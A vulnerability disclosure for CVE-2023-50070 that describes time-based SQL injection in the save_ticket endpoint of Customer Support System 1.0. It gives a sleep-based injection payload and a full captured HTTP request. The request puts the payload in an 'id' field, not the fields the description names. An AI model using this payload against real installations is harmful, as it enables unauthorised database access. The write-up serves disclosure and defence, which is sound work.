# CVE-2023-50070
# Customer Support System 1.0 - Multiple SQL injection vulnerabilities - save_ticket

**Description**: Multiple SQL injection vulnerabilities in /customer_support/ajax.php?action=save_ticket in Customer Support System 1.0 allow authenticated attackers to execute arbitrary SQL commands via department_id, customer_id and subject.

**Vulnerable Product Version**: Customer Support System 1.0  
**CVE Author**: Geraldo Alcântara  
**Date**: 29/11/2023  
**CVE**: CVE-2023-50070  
**CVE Link**: https://www.cve.org/CVERecord?id=CVE-2023-50070  
**NVD Link**: https://nvd.nist.gov/vuln/detail/CVE-2023-50070  
**Confirmed on**: 15/12/2023  
**Tested on**: Windows  
### Steps to reproduce:  
1- Log in to the application.  
2- Navigate to the page /customer_support/index.php?page=new_ticket.  
3- Create a new ticket and insert a malicious payload into one of the following parameters: department_id, customer_id, or subject.  
**Payload**: '+(select*from(select(sleep(20)))a)+'  

```
POST /customer_support/ajax.php?action=save_ticket HTTP/1.1
Host: 192.168.68.148
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0
Accept: */*
Accept-Language: pt-BR,pt;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br
X-Requested-With: XMLHttpRequest
Content-Type: multipart/form-data; boundary=---------------------------81419250823331111993422505835
Content-Length: 854
Origin: http://192.168.68.148
Connection: close
Referer: http://192.168.68.148/customer_support/index.php?page=new_ticket
Cookie: csrftoken=1hWW6JE5vLFhJv2y8LwgL3WNPbPJ3J2WAX9F2U0Fd5H5t6DSztkJWD4nWFrbF8ko; sessionid=xrn1sshbol1vipddxsijmgkdp2q4qdgq; PHPSESSID=mfd30tu0h0s43s7kdjb74fcu0l

-----------------------------81419250823331111993422505835
Content-Disposition: form-data; name="id"

'+(select*from(select(sleep(20)))a)+'
-----------------------------81419250823331111993422505835
Content-Disposition: form-data; name="subject"

teste
-----------------------------81419250823331111993422505835
Content-Disposition: form-data; name="customer_id"

3
-----------------------------81419250823331111993422505835
Content-Disposition: form-data; name="department_id"

4
-----------------------------81419250823331111993422505835
Content-Disposition: form-data; name="description"

<p>Blahs<br></p>
-----------------------------81419250823331111993422505835
Content-Disposition: form-data; name="files"; filename=""
Content-Type: application/octet-stream

-----------------------------81419250823331111993422505835--
```
Discoverer(s)/Credits:  
Geraldo Alcântara  
